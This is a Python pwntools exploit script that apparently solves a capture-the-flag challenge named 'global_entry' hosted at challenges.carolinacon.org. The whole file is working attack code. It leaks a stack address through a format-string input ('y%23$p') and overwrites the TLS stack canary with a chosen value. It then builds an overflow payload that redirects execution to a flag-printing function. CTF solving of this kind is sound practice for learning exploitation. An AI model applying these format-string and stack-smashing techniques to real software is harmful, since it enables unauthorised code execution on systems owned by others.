#!/usr/bin/env python3

from pwn import *

exe = ELF("./global_entry")

context.binary = exe

# TLS cookie overwrite is size == 6
# Must overwrite cookie to be 0x4142434445464748
# 54 bytes behind
# y%23$p fmt

def get_addr(p):
    p.recvuntil(b'please')
    p.recvline()

    p.sendline(b'y%23$p')
    
    p.recvuntil(b'You answered:')

    leak = int(p.recvline().strip().decode().split('y')[1], 16) - 54

    return leak

def pwn(p):
    get_flag = get_addr(p)
    print(hex(get_flag))

    payload = b''
    #padding = b'A'*88
    payload = b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHGFEDCBAZZZZZZZZ'
    payload += p64(get_flag)
    #payload += b'B'*8

    print(p.recvuntil(b'size of the new variable: '))
    p.sendline(b'6')
    print(p.recvuntil(b'new variable: '))
    p.sendline(payload)
    print(p.recvline())
    print(p.recvline())
    print(p.recvline())
    print(p.recvline())

def conn():
    args.LOCAL = False
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("challenges.carolinacon.org", 8006)

    pwn(r)

    return r

def main():
    r = conn()

    # good luck pwning :)

if __name__ == "__main__":
    main()
